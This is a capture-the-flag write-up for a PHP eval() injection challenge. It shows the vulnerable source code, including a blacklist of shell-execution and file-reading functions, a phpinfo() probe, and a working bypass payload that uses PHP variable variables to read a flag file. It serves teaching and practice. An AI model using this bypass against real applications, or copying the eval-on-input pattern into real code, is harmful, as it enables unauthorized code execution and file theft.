# Impasse

This is a PHP `eval()` injection challenge. 

When submitting the form, the input is wrapped around an `echo` statement and added to the `print` GET parameter:

```http
?print=echo+'<YOUR DATA>'+;
```

The first thing we tried was to modify the GET parameter to test for arbitrary code execution:

```
print=echo+'';phpinfo()
```

![](<../../.gitbook/assets/image (12).png>)

By checking the `debug` option, we are presented with the page's source code. The following code implements the input blacklist and the `eval()` vulnerability:

```php
<?php
error_reporting(0);
if (isset($_GET['print'])) {
  if (!empty($_GET['print'])){
    $printValue= strtolower($_GET['print']);
    $blocked = array("cat", "more" ,"readfile", "fopen", "file_get_contents", "file", "SplFileObject" );
    $special_block= "nc";
    $$special_block= "../flag.txt";
    foreach ($blocked as $value) {
      if (strpos($printValue, $value) || preg_match('/\bsystem|\bexec|\bbin2hex|\bassert|\bpassthru|\bshell_exec|\bescapeshellcmd| \bescapeshellarg|\bpcntl_exec|\busort|\bpopen|\bflag\.txt|\bspecial_block|\brequire|\bscandir|\binclude|\bhex2bin|\$[a-zA-Z]|[#!%^&*_+=\-,\.:`|<>?~\\\\]/i', $printValue)) {
        $printValue="";
        echo "<script>alert('Bad character/word ditected!');</script>";
        break;
      }
    }
  eval($printValue . ";");
  } 
}
?>
```

Many useful functions have been blocked! But note that the `eval()` statement is called _after_ the `$blocked`, `$special_block` and `$$special_block` variables are defined. This allows us to reference these variables in our `eval`-ed code.

Note that `$$` has a special meaning in PHP: [https://stackoverflow.com/questions/4169882/what-is-in-php](https://stackoverflow.com/questions/4169882/what-is-in-php)

```php
$foo = 'hello';
$hello = 'The Output';
echo $$foo; // displays "The Output"
```

What happens here is that the value of  `$foo` is used as a variable name, and so `$$foo` becomes `$hello` (think of it as replacing `$foo` in `$$foo`).

```php
$special_block= "nc";
$$special_block= "../flag.txt";
```

Here, the value of `$special_block` is used as a variable name. The second line defines a new variable, `$nc`, which has the value of `"../flag.txt"`.

Our final payload is

```
?print=echo+'';print(eval('return ${blocked}[4](${nc});'))
```

which leads to the following code being `eval`-ed:

```php
print(eval('return file_get_contents("../flag.txt");')
```

Note that `$[a-zA-Z]` is blocked in the regex, so we must use `${...}` instead (which achieves the same purpose). Also, `eval()` executes `file_get_contents("../flag.txt")` but doesn't display anything to us yet. By returning and printing the output, we retrieve the flag.
